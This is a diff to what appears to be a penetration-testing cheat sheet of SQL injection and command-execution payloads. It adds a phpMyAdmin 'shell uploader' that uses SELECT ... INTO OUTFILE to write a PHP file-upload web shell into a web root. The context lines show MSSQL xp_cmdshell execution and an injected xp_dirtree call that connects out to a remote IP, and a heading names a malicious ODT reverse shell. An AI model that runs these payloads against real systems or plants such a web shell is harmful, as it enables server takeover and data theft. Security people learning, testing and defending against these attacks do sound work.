@@ -178,6 +178,13 @@ EXEC master..xp_cmdshell 'whoami'
 http://<IP>/test?test=1; EXEC master ..xp_dirtree '\\10.10.15.237\test'; --
 
 ```
+```bash
+SHELL UPLOADER PHPMYADMIN
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+
 ### SMTP
 ```bash
 # Crafting a malicious ODT file reverse shell
